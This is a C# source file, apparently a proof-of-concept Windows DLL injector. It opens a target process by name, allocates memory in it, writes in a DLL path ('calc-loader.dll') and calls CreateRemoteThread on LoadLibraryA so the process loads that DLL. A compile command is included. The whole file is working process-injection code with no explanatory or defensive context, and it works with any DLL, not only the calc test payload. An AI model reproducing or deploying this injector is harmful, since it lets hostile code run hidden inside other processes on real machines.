using System;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Runtime.InteropServices;

public class load
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // used for memory allocation
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;

    static void Main(string[] args)
    {

	// Compile : "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /platform:x64 /unsafe load.cs
	
	String dllName = "C:\\Tools\\calc-loader.dll";
	string dllFullPath = Path.GetFullPath(dllName);
        
	Console.WriteLine(dllFullPath);

	Process[] explorerProcess = Process.GetProcessesByName("load");
	
	int explorerProcessID = explorerProcess[0].Id;

	IntPtr targetProcessHandle = OpenProcess(0x001F0FFF, false, explorerProcessID);
	IntPtr baseAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, (uint)dllFullPath.Length, 0x3000, 0x40);
	IntPtr bytesWritten;

	WriteProcessMemory(targetProcessHandle, baseAddress, Encoding.Default.GetBytes(dllFullPath), dllFullPath.Length, out bytesWritten);

	IntPtr processLoadID = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	IntPtr handleThread = CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, processLoadID, baseAddress, 0, IntPtr.Zero);
	Console.ReadLine();
    }
}